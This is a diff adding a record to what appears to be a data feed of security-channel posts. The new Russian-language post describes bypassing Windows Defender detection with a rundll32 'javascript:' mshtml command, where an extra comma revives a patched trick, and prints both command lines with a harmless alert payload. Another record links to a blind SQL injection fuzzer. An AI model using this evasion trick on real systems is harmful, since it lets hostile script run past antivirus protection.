@@ -1,4 +1,10 @@
 {
+    "date": "2024-02-12",
+    "from_channel": "proxy_bar",
+    "message": "Windows Defender Detection Mitigation Bypass Vulnerability\nWin LPE\nВ 2022 году hyp3rlinx рассказывал как можно обойти windows defender передав дополнительный путь при ссылке на mshtml, дырку пофиксили. НО, добавив пару запятых в старый трюк - и опять bypass. \n*\nто есть было и пофиксили:\nC:\\sec>rundll32.exe javascript:\"\\..\\..\\mshtml,RunHTMLApplication \";alert(666)\nмагия запятой:\nC:\\sec>rundll32.exe javascript:\"\\..\\..\\mshtml,,RunHTMLApplication \";alert(666)\nсобака старая, трюки новые.\nCVE пока не имеет )\n\n#defender #bypass",
+    "urls": []
+}
+{
     "date": "2024-02-10",
     "from_channel": "defcon_news",
     "message": "SqliSniper - Advanced Time-based Blind SQL Injection Fuzzer For HTTP Headers\nhttp://www.kitploit.com/2024/02/sqlisniper-advanced-time-based-blind.html",
